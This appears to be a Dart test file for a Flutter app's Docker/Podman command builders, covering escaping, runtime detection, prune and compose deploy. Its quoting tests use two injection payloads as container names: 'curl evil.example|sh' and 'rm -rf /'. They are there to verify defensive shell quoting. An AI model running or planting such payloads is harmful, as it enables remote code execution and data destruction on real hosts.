import 'package:flutter_test/flutter_test.dart';
import 'package:omniterm/data/remote_commands.dart';

/// These command strings are dense shell, and Dart's `$` interpolation collides with the shell's.
/// A mis-escaped `$` produces a command that still *looks* right in source but silently expands to
/// nothing on the host, so the shape of the generated text is asserted directly.
void main() {
  group('shell variables survive Dart interpolation', () {
    test('the runtime-detection subshell is intact, not expanded by Dart', () {
      // `$(…)` must reach the host verbatim.
      expect(dockerPsCommand, contains(r'$(if command -v docker'));
    });

    test('shell variables are plain, with no stray backslash', () {
      // `\$ids` would make the shell look for a literal-dollar command, not the variable.
      for (final cmd in [
        dockerPsCommand,
        dockerRestartsCommand,
        dockerImagesCommand,
      ]) {
        expect(
          cmd,
          isNot(contains(r'\$')),
          reason: r'a backslash-escaped $ is not shell syntax',
        );
      }
      expect(dockerRestartsCommand, contains(r'-n "$ids"'));
      expect(dockerPsCommand, contains(r'[ "$found" = 0 ]'));
    });

    test(
      'the format tabs are literal backslash-t for the runtime to interpret',
      () {
        expect(dockerPsCommand, contains(r'{{.ID}}\t{{.Names}}'));
        expect(
          dockerPsCommand,
          isNot(contains('\t')),
          reason: 'a real tab would break the template',
        );
      },
    );
  });

  group('both runtimes are queried', () {
    test('every probe asks docker and podman separately', () {
      for (final cmd in [
        dockerPsCommand,
        dockerImagesCommand,
        dockerVolumesCommand,
        dockerNetworksCommand,
        dockerRestartsCommand,
        dockerRuntimesCommand,
      ]) {
        expect(cmd, contains('command -v docker'));
        expect(cmd, contains('command -v podman'));
      }
    });

    test('each row is prefixed with its runtime', () {
      // A host running both has the same repo:tag in each and a `bridge` network per runtime;
      // nothing else on a row says which engine owns it.
      expect(dockerPsCommand, contains(r"'docker\t"));
      expect(dockerPsCommand, contains(r"'podman\t"));
      expect(dockerImagesCommand, contains(r"'docker\t"));
      expect(dockerImagesCommand, contains(r"'podman\t"));
      expect(dockerVolumesCommand, contains(r"s/^/docker\t/"));
      expect(dockerVolumesCommand, contains(r"s/^/podman\t/"));
    });

    test('a runtime is only used when its ps actually answers', () {
      // A binary whose daemon or socket is unreachable would otherwise be selected and then fail
      // on every call.
      expect(
        dockerRuntimesCommand,
        contains('docker ps >/dev/null 2>&1; then echo docker'),
      );
      expect(
        dockerRuntimesCommand,
        contains('podman ps >/dev/null 2>&1; then echo podman'),
      );
    });

    test(
      'the compose label templates differ per runtime, as the engines require',
      () {
        // Docker has a `.Label "key"` method and a string `.Labels`; Podman has no `.Label` and a
        // map `.Labels`. Using either syntax on the other engine errors out.
        expect(
          dockerPsCommand,
          contains(r'{{.Label "com.docker.compose.project"}}'),
        );
        expect(
          dockerPsCommand,
          contains(r'{{index .Labels "com.docker.compose.project"}}'),
        );
      },
    );

    test('restart counts use each engine\'s own inspect field name', () {
      // Docker's template field is `.Id`; Podman's is `.ID`, and `.Id` errors there.
      expect(
        dockerRestartsCommand,
        contains(r"'docker\t{{.Id}}\t{{.RestartCount}}'"),
      );
      expect(
        dockerRestartsCommand,
        contains(r"'podman\t{{.ID}}\t{{.RestartCount}}'"),
      );
    });
  });

  group('actions quote their identifiers', () {
    test('a crafted container name cannot inject a command', () {
      final cmd = dockerAction(
        r'x; curl evil.example|sh',
        'stop',
        runtime: 'docker',
      );
      expect(cmd, contains(r"'x; curl evil.example|sh'"));
      expect(cmd, startsWith('docker stop '));
    });

    test('every action family quotes', () {
      const payload = r"a'; rm -rf /; '";
      for (final cmd in [
        dockerAction(payload, 'stop', runtime: 'docker'),
        dockerImageAction(payload, 'remove', runtime: 'docker'),
        dockerVolumeAction(payload, 'remove', runtime: 'docker'),
        dockerNetworkAction(payload, 'remove', runtime: 'docker'),
      ]) {
        expect(cmd, contains(shellQuote(payload)));
      }
    });

    test('remove maps to the right verb per resource', () {
      expect(
        dockerAction('c', 'remove', runtime: 'docker'),
        contains('docker rm -f'),
      );
      expect(
        dockerImageAction('i', 'remove', runtime: 'docker'),
        contains('docker rmi -f'),
      );
      expect(
        dockerVolumeAction('v', 'remove', runtime: 'docker'),
        contains('docker volume rm -f'),
      );
      expect(
        dockerNetworkAction('n', 'remove', runtime: 'docker'),
        contains('docker network rm'),
      );
    });

    test('lifecycle verbs pass through unchanged', () {
      for (final action in ['start', 'stop', 'restart', 'pause', 'unpause']) {
        expect(
          dockerAction('c', action, runtime: 'podman'),
          startsWith('podman $action '),
        );
      }
    });

    test('an unspecified runtime falls back to the run-time probe', () {
      // Acting on a row whose runtime is unknown must still reach whichever engine is present.
      expect(dockerAction('c', 'stop'), contains(r'$(if command -v docker'));
    });
  });

  group('prune', () {
    test('images prune runs on each runtime the host has', () {
      final cmd = dockerPruneImages();
      expect(cmd, contains('docker image prune -a -f'));
      expect(cmd, contains('podman image prune -a -f'));
    });

    test('volume prune uses -a, matching the "unused volumes" wording', () {
      // Plain `volume prune -f` removes only anonymous volumes, which is a narrower promise than
      // the button makes.
      expect(dockerPruneVolumes(), contains('docker volume prune -a -f'));
      expect(dockerPruneVolumes(), contains('podman volume prune -a -f'));
    });

    test('a missing runtime does not fail the whole command', () {
      // `; true; }` keeps a host with only one engine from returning an error for the other.
      expect(dockerPruneImages(), contains('true; }'));
    });

    test('network prune runs on both available runtimes', () {
      expect(dockerPruneNetworks(), contains('docker network prune -f'));
      expect(dockerPruneNetworks(), contains('podman network prune -f'));
    });
  });

  group('compose builder transport', () {
    test('read targets the exact path and distinguishes a missing file', () {
      final command = composeRead('/srv/demo/docker-compose.yml');
      expect(command, contains(shellQuote('/srv/demo/docker-compose.yml')));
      expect(command, contains('OMNITERM_NO_FILE'));
    });

    test(
      'deploy validates a staged file and restores the prior file on failure',
      () {
        final command = composeDeploy(
          '/srv/demo/compose.yml',
          'demo',
          'services:\n  web:\n    image: nginx\n',
          workingDir: '/srv/demo',
          configFiles: '/srv/demo/compose.yml,/srv/demo/override.yml',
          runtime: 'docker',
        );

        expect(command, contains(r'config >/dev/null'));
        expect(command, contains('VALIDATION FAILED — stack unchanged'));
        expect(
          command,
          contains('DEPLOY FAILED — restoring previous compose file'),
        );
        expect(command, contains("-f '/srv/demo/override.yml'"));
        expect(command, contains('OMNITERM_DEPLOY_OK'));
        expect(
          command,
          isNot(contains('services:\n')),
          reason: 'YAML must travel as base64, never raw shell text',
        );
      },
    );
  });

  group('compose actions', () {
    test('following one service does not stream the entire stack', () {
      final command = dockerComposeAction(
        'demo',
        '/srv/demo',
        '/srv/demo/compose.yml',
        'followLogs',
        service: 'web worker',
        runtime: 'docker',
      );

      expect(command, contains("logs -f --tail 100 'web worker'"));
    });

    test('following a stack streams all services', () {
      final command = dockerComposeAction(
        'demo',
        '/srv/demo',
        '/srv/demo/compose.yml',
        'followLogs',
        runtime: 'docker',
      );

      expect(command, contains('logs -f --tail 100 2>&1'));
    });
  });
}
